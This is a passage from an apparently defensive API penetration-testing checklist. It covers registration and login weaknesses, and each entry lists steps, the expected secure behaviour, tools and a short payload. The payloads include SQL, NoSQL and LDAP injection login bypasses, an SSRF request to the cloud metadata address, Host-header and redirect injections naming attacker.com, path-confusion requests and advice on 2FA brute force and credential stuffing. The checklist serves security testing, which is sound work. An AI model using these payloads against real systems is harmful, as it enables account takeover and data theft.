**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Register normally<br>2. Intercept response<br>3. Modify role in response to admin<br>4. Check if frontend trusts response

**Expected Result:** Server should enforce authorization on each request

**Payload / PoC Example:**

```
Response: {"userId":1, "role":"admin"}
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0036 — Unicode/Special Character Handling
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Register with unicode characters<br>2. Use emojis and special chars<br>3. Check database storage

**Expected Result:** Should properly handle and sanitize unicode

**Payload / PoC Example:**

```
name:Admin , email: test@tÃ«st.com
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0037 — Phone Number Validation Bypass
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Submit invalid phone formats<br>2. Try international formats<br>3. Test special characters in phone field

**Expected Result:** Should validate phone number format strictly

**Payload / PoC Example:**

```
+1-555-0123 vs ++1555abc0123
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0038 — Age/Date Validation Bypass
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Submit future dates<br>2. Try invalid date formats<br>3. Test boundary conditions

**Expected Result:** Should validate date ranges and formats

**Payload / PoC Example:**

```
birthdate: 2099-01-01 or birthdate: not-a-date
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0039 — SSRF via Avatar URL on Registration
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API7:2023 Server Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Register with avatar_url field<br>2. Point to internal: http://169.254.169.254/latest/meta-data/<br>3. Use Burp Collaborator for blind SSRF

**Expected Result:** Server validates URL against allowlist; RFC1918 blocked

**Payload / PoC Example:**

```
POST /api/register {"avatar_url":"http://169.254.169.254/latest/meta-data/"}
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Collaborator, SSRFmap

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API7:2023 Server Side Request Forgery

---

## API-0040 — Open Redirect via Return URL on Register
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Add ?next= or ?redirect= param to registration URL<br>2. Inject attacker domain<br>3. Check if redirected after registration

**Expected Result:** Server validates redirect URL against allowlist

**Payload / PoC Example:**

```
POST /register?next=https://attacker.com
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0041 — Referral Code IDOR
**Phase:** 4-Auth: Registration · **Category:** Authentication · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Registration — Registration endpoint — signup fields

**Test Steps:** 1. Register with referral code belonging to another user<br>2. Check if credits applied to wrong account<br>3. Fuzz referral code values

**Expected Result:** Referral code ownership validated server-side

**Payload / PoC Example:**

```
POST /register {"referral_code":"USR-00001"}  (enumerate codes)
```

**Impact:** Abuse of signup flow; duplicate/privileged account creation

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API1:2023 Broken Object Level Authorization

---

## API-0042 — Email enumeration via response or timing
**Phase:** 4-Auth: Registration · **Category:** Discovery · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** POST Recon — external attack surface (endpoints/params)

**Test Steps:** 1. Register with existing email<br>2. Register with new email<br>3. Compare status codes / messages / response time / length

**Expected Result:** Identical response for both

**Payload / PoC Example:**

```
existing@target.com vs random_uuid@target.com
```

**Impact:** Brute-force prep; PII-by-association

**Tools:** Burp Suite,custom timing script

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API5:2023 Broken Function Level Authorization

---

## API-0043 — IDOR in email verification token
**Phase:** 4-Auth: Registration · **Category:** IDOR · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Direct object reference (ID in path/param/body)

**Test Steps:** 1. Get verify token for User A<br>2. Try /verify?userId=2&amp;token=A or sequential token<br>3. Verify victim account

**Expected Result:** Tokens unique per user and unpredictable

**Payload / PoC Example:**

```
GET /verify?userId=2&token=123
```

**Impact:** Account takeover without password

**Tools:** Burp Intruder

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API1:2023 Broken Object Level Authorization

---

## API-0044 — Host header injection in welcome / verification email
**Phase:** 4-Auth: Registration · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Host / X-Forwarded-* / custom headers

**Test Steps:** 1. Set Host: attacker.com in registration<br>2. Receive email; inspect link<br>3. If link points to attacker.com -&gt; phishing pivot

**Expected Result:** Server should derive URL from trusted config

**Payload / PoC Example:**

```
Host: attacker.com
```

**Impact:** Phishing + token capture -&gt; ATO

**Tools:** Burp Suite

**References:** -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle 'Cracking the Lens' (PortSwigger Research); PortSwigger Academy; API8:2023 Security Misconfiguration

---

## API-0045 — Race condition: bypass email uniqueness via single-packet
**Phase:** 4-Auth: Registration · **Category:** Race Condition · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Concurrent requests to a state-changing endpoint

**Test Steps:** 1. Send 50 concurrent register requests with same email (Turbo Intruder gate sync)<br>2. Check if more than one account created

**Expected Result:** Server enforces uniqueness atomically

**Payload / PoC Example:**

```
Turbo Intruder single-packet attack
```

**Impact:** Multi-account abuse / collision

**Tools:** Turbo Intruder

**References:** -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle 'Smashing the State Machine' (BlackHat 2023); Turbo Intruder; OWASP WSTG; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0046 — Email verification bypass to access privileged area
**Phase:** 4-Auth: Registration · **Category:** Security Misconfiguration · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Register without verifying email<br>2. Hit /dashboard /api/me /billing directly<br>3. Skip verification token consumption

**Expected Result:** Unverified accounts should be blocked from sensitive endpoints

**Payload / PoC Example:**

```
GET /api/billing without /verify
```

**Impact:** Skips published security control

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API2:2023 Broken Authentication

---

## API-0047 — Credential stuffing with HIBP combos
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Login endpoint — username/password fields

**Test Steps:** 1. Use leaked email:pass DB<br>2. Hit /login at low rate<br>3. Track 200 responses

**Expected Result:** Detect breached creds; force re-auth on suspicious IP

**Payload / PoC Example:**

```
Curated leaked combolist
```

**Impact:** Mass ATO

**Tools:** custom python,sentry MBA

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0048 — 2FA bypass via direct route
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST 2FA/OTP verification endpoint

**Test Steps:** 1. Submit valid creds; receive 2FA prompt<br>2. Skip /verify-2fa; hit /api/dashboard or /api/me directly<br>3. Check if data returned

**Expected Result:** Server enforces 2FA before issuing session

**Payload / PoC Example:**

```
GET /api/me with partially-issued token
```

**Impact:** Defeats published 2FA control

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0049 — 2FA bypass via response tampering
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST 2FA/OTP verification endpoint

**Test Steps:** 1. Submit invalid 2FA code<br>2. Intercept response<br>3. Change "verified":false to true

**Expected Result:** Server validates state on backend

**Payload / PoC Example:**

```
{"verified":false} -> {"verified":true}
```

**Impact:** ATO bypassing 2FA

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0050 — 2FA brute force without rate limit
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST 2FA/OTP verification endpoint

**Test Steps:** 1. Burp Intruder iterate 000000-999999<br>2. Rotate IP via X-Forwarded-For if needed<br>3. Verify lockout / cool-down

**Expected Result:** Lockout after 5 attempts; cool-down per session

**Payload / PoC Example:**

```
Numeric range payload 000000-999999
```

**Impact:** ATO of 2FA accounts

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0051 — 2FA backup code reuse
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST 2FA/OTP verification endpoint

**Test Steps:** 1. Use a backup code<br>2. Logout<br>3. Re-login and reuse same backup code

**Expected Result:** Backup codes single use

**Payload / PoC Example:**

```
Replay backup code
```

**Impact:** Long-term ATO

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0052 — SQL Injection in Login
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — Login endpoint — username/password fields

**Test Steps:** 1. Inject SQL in username/password<br>2. Try authentication bypass<br>3. Check if logged in without valid credentials

**Expected Result:** Should reject with validation error

**Payload / PoC Example:**

```
username: ' OR '1'='1' --
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** SQLMap, Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0053 — NoSQL Injection in Login
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — Login endpoint — username/password fields

**Test Steps:** 1. Send NoSQL injection payloads<br>2. Try authentication bypass<br>3. Test various NoSQL operators

**Expected Result:** Should validate and reject malicious input

**Payload / PoC Example:**

```
{"username": {"$gt":""}, "password": {"$gt":""}}
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** NoSQLMap, Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0054 — Brute Force Attack
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — Login endpoint — username/password fields

**Test Steps:** 1. Attempt multiple login tries with different passwords<br>2. Check if account locks<br>3. Verify rate limiting

**Expected Result:** Should implement account lockout and rate limiting

**Payload / PoC Example:**

```
Automated password list attack
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** Hydra, Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0055 — Credential Stuffing
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — Login endpoint — username/password fields

**Test Steps:** 1. Use leaked credential databases<br>2. Test known email:password combinations<br>3. Check if any succeed

**Expected Result:** Should have breach detection and rate limiting

**Payload / PoC Example:**

```
Known compromised credentials
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** Custom Scripts

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0056 — Username/Email Enumeration
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Login — Login endpoint — username/password fields

**Test Steps:** 1. Try login with existing username<br>2. Try with non-existing username<br>3. Compare responses and timing

**Expected Result:** Responses should be identical for existing/non-existing users

**Payload / PoC Example:**

```
Different errors: 'User not found' vs 'Invalid password'
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API5:2023 Broken Function Level Authorization

---

## API-0057 — Session Fixation
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — Login endpoint — username/password fields

**Test Steps:** 1. Get session token before login<br>2. Login with that session<br>3. Check if same session continues

**Expected Result:** Should generate new session after authentication

**Payload / PoC Example:**

```
Reuse pre-login session token
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0058 — Concurrent Session
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Login — Login endpoint — username/password fields

**Test Steps:** 1. Login from Device A<br>2. Login from Device B with same credentials<br>3. Check if both sessions active

**Expected Result:** Should invalidate old session or limit concurrent sessions

**Payload / PoC Example:**

```
Multiple active sessions simultaneously
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0059 — 2FA Bypass - Direct Access
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — 2FA/OTP verification endpoint

**Test Steps:** 1. Enter valid credentials (2FA enabled)<br>2. Skip 2FA step<br>3. Try accessing protected endpoints directly

**Expected Result:** Should enforce 2FA before granting access

**Payload / PoC Example:**

```
After username/password, skip /verify-2fa, go to /dashboard
```

**Impact:** 2FA/MFA bypass defeats second factor; account takeover

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0060 — 2FA Bypass - Response Manipulation
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — 2FA/OTP verification endpoint

**Test Steps:** 1. Enter wrong 2FA code<br>2. Intercept response<br>3. Change success:false to success:true

**Expected Result:** Server should validate 2FA on backend

**Payload / PoC Example:**

```
Change {"success":false} to {"success":true}
```

**Impact:** 2FA/MFA bypass defeats second factor; account takeover

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0061 — 2FA Bypass - Code Reuse
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — 2FA/OTP verification endpoint

**Test Steps:** 1. Use 2FA code successfully<br>2. Logout<br>3. Login again and reuse same code

**Expected Result:** Code should be single-use only

**Payload / PoC Example:**

```
Reuse old TOTP code
```

**Impact:** 2FA/MFA bypass defeats second factor; account takeover

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0062 — 2FA Brute Force
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — 2FA/OTP verification endpoint

**Test Steps:** 1. Automate 2FA code guessing (000000-999999)<br>2. Check rate limiting<br>3. Verify account lockout

**Expected Result:** Should limit attempts (3-5) and implement delays

**Payload / PoC Example:**

```
Brute force 6-digit codes
```

**Impact:** 2FA/MFA bypass defeats second factor; account takeover

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0063 — 2FA Backup Code Abuse
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — 2FA/OTP verification endpoint

**Test Steps:** 1. Request backup codes<br>2. Try using same backup code multiple times<br>3. Check if backup codes are rate limited

**Expected Result:** Backup codes should be single-use

**Payload / PoC Example:**

```
Reuse backup code multiple times
```

**Impact:** 2FA/MFA bypass defeats second factor; account takeover

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0064 — Remember Me Cookie Security
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Login — Login endpoint — username/password fields

**Test Steps:** 1. Login with 'Remember Me'<br>2. Analyze cookie<br>3. Check for encryption and secure flags

**Expected Result:** Should be encrypted with HttpOnly and Secure flags

**Payload / PoC Example:**

```
Inspect remember_me cookie attributes
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** Browser DevTools

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0065 — Login CSRF
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Login — Login endpoint — username/password fields

**Test Steps:** 1. Create malicious login form<br>2. Trick victim to auto-login<br>3. Victim uses attacker's account

**Expected Result:** Should implement CSRF tokens on login

**Payload / PoC Example:**

```
Auto-submit form to login victim with attacker credentials
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** Manual/Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0066 — Timing-Based Account Enumeration on Login
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Login — Login endpoint — username/password fields

**Test Steps:** 1. Time response for valid user + wrong password<br>2. Time response for invalid user<br>3. Use statistical analysis (10+ samples each)<br>4. Compare mean response times

**Expected Result:** Constant-time comparison used; no timing difference observable

**Payload / PoC Example:**

```
Script: time 100 requests each for valid/invalid usernames
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** Python timing script, Burp

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0067 — Password Reset via SMS OTP Bypass
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Password Reset — 2FA/OTP verification endpoint

**Test Steps:** 1. Request SMS OTP for password reset<br>2. Attempt OTP without SIM (brute-force 6 digits)<br>3. Check for OTP reuse within validity window

**Expected Result:** OTP rate limited; single-use; expires in ≤5 min

**Payload / PoC Example:**

```
Burp Intruder cycling 000000-999999 on /api/verify-sms-otp
```

**Impact:** 2FA/MFA bypass defeats second factor; account takeover

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0068 — API Gateway Authentication Bypass via Path Confusion
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login endpoint — username/password fields

**Test Steps:** 1. Try URL encoding: /api/admin%2fusers<br>2. Try double encoding: /api/admin%252fusers<br>3. Try case variation: /API/Admin/Users<br>4. Check if gateway misroutes bypassing auth

**Expected Result:** Gateway and backend normalize paths consistently; auth applied post-normalization

**Payload / PoC Example:**

```
GET /api/%61dmin/users (URL encoded 'a')
GET /api/./admin/users
GET /api/admin/..%2fusers
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API5:2023 Broken Function Level Authorization

---

## API-0069 — gRPC Authentication Bypass - Missing Interceptor
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login endpoint — username/password fields

**Test Steps:** 1. Call protected gRPC methods without metadata auth token<br>2. Test each service method individually<br>3. Check if interceptor consistently applied

**Expected Result:** Auth interceptor applied globally to all gRPC methods

**Payload / PoC Example:**

```
grpcurl -plaintext -d '{}' target:443 com.example.AdminService/GetAllUsers
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** grpcurl

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0070 — LDAP Injection - Authentication Bypass
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login endpoint — username/password fields

**Test Steps:** 1. Find LDAP-backed authentication<br><br>2. Inject LDAP filter syntax<br><br>3. Bypass authentication<br><br>4. Gain unauthorized access

**Expected Result:** Should use parameterized LDAP queries

**Payload / PoC Example:**

```
username=*)(uid=*))(|(uid=*
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0071 — gRPC Authentication Bypass
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login endpoint — username/password fields

**Test Steps:** 1. Send gRPC request without metadata<br><br>2. Omit authentication tokens<br><br>3. Access protected methods<br><br>4. Check authorization

**Expected Result:** Should require authentication on all methods

**Payload / PoC Example:**

```
gRPC request without auth metadata
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** grpcurl

